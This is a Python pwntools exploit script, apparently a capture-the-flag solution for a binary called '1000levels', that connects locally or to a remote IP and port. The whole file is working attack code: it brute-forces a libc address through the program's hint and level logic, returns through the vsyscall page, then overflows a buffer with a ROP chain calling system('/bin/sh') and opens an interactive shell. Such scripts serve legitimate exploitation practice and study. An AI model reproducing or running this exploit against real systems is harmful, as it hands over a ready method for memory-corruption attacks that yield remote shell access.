from pwn import *
import sys,getopt
import time

args = sys.argv[1:]
context(os='linux', arch='amd64')
debug = 1 if '-nd' not in args else 0

proc_name = './1000levels'
local = 1 if '-r' not in args else 0
isattach = local & 1  
bps = isattach &1 
ip = '47.74.147.103'
port = 20001
io = None


def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def sd(data):
	return io.send(data)
def rl():
	return io.recvline()
def lg(data):
    return log.info(data)
def sa(d,data):
    return io.sendafter(d,data)

def attach():
    if isattach:
        if bps:
            gdb.attach(pidof(io)[0], open('bps'))
        else:
            gdb.attach(pidof(io)[0])
def hint():
    sa('Choice:\n','2')

def go(levels,more):
    sa('Choice:\n','1')
    sa('levels?\n',str(levels))
    sa('more?\n',str(more))

def level(ans):
    sa('Answer:',ans)

def pwn():
    makeio()
    if debug:
        context.log_level = 'debug'
    # attach()
    leak = 0x700000000390
    for i in range(0x8,0x0,-1): # (8,7...,1)
        for j in range(0xf,-0x1,-1): # (0xf,0xd...,0x1,0x0)
            hint() # set system
            temp = leak + j * (1 << (i+2)*4)
            go(0,-temp)
            result = rl()   # dont use recv() beacuse sendlineafter in level
            print result
            if 'Coward' not in result: break
        leak = temp
        for k in range(999):
            level(p64(0)*5)
        log.info('level success')
        log.info('Got system:' + hex(leak))
        attach()
        # raw_input('break *0x0000555555554F4D')
        level(p64(0xffffffffff600400)*35) # return to start
    system_addr = leak + 0x1000
    log.info('Got system:'+ hex(system_addr))

    libc = ELF('./local.libc.so.6')
    system_offset = libc.symbols['system']
    libc_addr = system_addr - system_offset
    binsh_addr = libc_addr + next(libc.search('/bin/sh\x00'))
    poprdi_ret = libc_addr + 0x21102

    go(0,1)
    payload = p64(poprdi_ret) + p64(binsh_addr) + p64(system_addr) 
    level('A'*0x30 + 'B'*0x8 + payload)
    
    sl('ls')
    io.interactive()


if __name__ == '__main__':
	pwn()



